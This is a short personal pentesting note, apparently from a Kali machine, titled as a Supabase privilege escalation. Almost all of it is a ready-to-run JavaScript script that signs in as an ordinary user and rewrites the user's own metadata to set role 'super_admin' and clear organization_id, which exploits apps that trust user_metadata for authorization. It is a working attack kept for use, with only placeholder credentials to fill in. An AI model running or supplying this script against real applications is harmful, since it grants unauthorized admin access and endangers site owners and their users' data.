These are from my kali - transfer any notes from here when you have time!!!!!!!!!

Privesc supabase using user_metadata as security

```javascript
async function runMetadataUpdate() {
  try {
    console.log("Loading Supabase library...");
    const { createClient } = await import('https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm');
    console.log("Library loaded.");

    const YOUR_SUPABASE_URL = 'YOUR_SUPABASE_URL';
    const YOUR_ANON_KEY = 'YOUR_PUBLIC_ANON_KEY'; 
    const YOUR_EMAIL = 'your-email@example.com'; 
    const YOUR_PASSWORD = 'your-password'; 

    const supabase = createClient(YOUR_SUPABASE_URL, YOUR_ANON_KEY);
    console.log("Supabase client created. Signing in...");

    const { data: loginData, error: loginError } = await supabase.auth.signInWithPassword({
      email: YOUR_EMAIL,
      password: YOUR_PASSWORD,
    });
    if (loginError) throw loginError;
    console.log("Successfully logged in as:", loginData.user.email);

    console.log("Attempting to update user metadata...");
    const { data: updateData, error: updateError } = await supabase.auth.updateUser({
      data: {
        role: 'super_admin',   
        organization_id: null   
      }
    });
    if (updateError) throw updateError;
    
    console.log("SUCCESS?");
    console.log("Your new metadata is:", updateData.user.user_metadata);

  } catch (error) {
    console.error("FAILED:", error.message);
    console.error("Check that your URL, Key, Email, and Password are correct.");
  }
}

runMetadataUpdate();
```